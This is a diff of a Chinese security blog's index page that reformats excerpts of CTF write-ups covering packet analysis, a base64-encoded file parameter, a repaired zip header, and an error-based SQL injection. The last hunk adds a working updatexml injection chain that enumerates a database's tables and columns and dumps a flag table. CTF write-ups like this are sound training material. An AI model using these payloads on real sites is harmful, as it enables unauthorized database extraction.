@@ -580,9 +580,7 @@
 
       
         
-          
-          Wireshark该题的流量包文件：链接：https://pan.baidu.com/s/1k5EcRKkeSun5nzhyvPdqlg 密码：i8sh使用wireshark打开这个流量包文件，观察发现里面的http流量包应该是有东西的，然后http流量包过滤跟踪第一个http包的数据流发现里面是访
-          ...
+          <h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>该题的流量包文件：<br><code>链接：https://pan.baidu.com/s/1k5EcRKkeSun5nzhyvPdqlg 密码：i8sh</code><br>使用wireshark打开这个流量包文件，观察发现里面的http流量包应该是有东西的，然后http流量包过滤  </p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/04/20/DDCTF2019 MISC wireshark/#more" rel="contents">
@@ -759,9 +757,7 @@
 
       
         
-          
-          滴~打开网站，看到url有一个jpg参数，是一个base64加密的字符串，查看源码，图片是以数据流的形式展示输出将字符串TmpZMlF6WXhOamN5UlRaQk56QTJOdz09两次base64解码，再解一次十六进制，得到flag.jpg通过这个思路，可以读一下index.php文件，先转一次
-          ...
+          <h4 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h4><p>打开网站，看到url有一个jpg参数，是一个base64加密的字符串，查看源码，图片是以数据流的形式展示输出  </p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/04/20/DDCTF2019 部分web/#more" rel="contents">
@@ -938,9 +934,7 @@
 
       
         
-          
-          MISC真的不是图片binwalk发现有一个zip文件，但是使用foremost分离不出来，猜测可能是少了zip文件头使用winhex查看，搜索十六进制 14000000，发现前面四个字节是 6a613636 (代表字符 ja66)那就是zip文件头的四个字节被改了，改回zip文件头就可以使用bin
-          ...
+          <h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h5 id="真的不是图片"><a href="#真的不是图片" class="headerlink" title="真的不是图片"></a>真的不是图片</h5><p>binwalk发现有一个zip文件，但是使用foremost分离不出来，猜测可能是少了zip文件头</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/04/15/掘安杯writeup/#more" rel="contents">
@@ -1117,9 +1111,8 @@
 
       
         
-          
-          土肥原贤二(WEB 报错注入)字符型报错注入，直接一套payload带走1234567' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -luozhen' and updatexml(1,concat(0x7e,(select 
-          ...
+          <h3 id="土肥原贤二-WEB-报错注入"><a href="#土肥原贤二-WEB-报错注入" class="headerlink" title="土肥原贤二(WEB 报错注入)"></a>土肥原贤二(WEB 报错注入)</h3><p>字符型报错注入，直接一套payload带走<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line">luozhen</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>luozhen<span class="string">'),0x7e),1)-- -</span></span><br><span class="line"><span class="string">flag,goods</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>,flag</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)-- -</span></span><br></pre></td></tr></table></figure></p>
+<p>得到flag：flag{20_welcome_19}</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/04/09/嘉韦思杯部分writeup/#more" rel="contents">
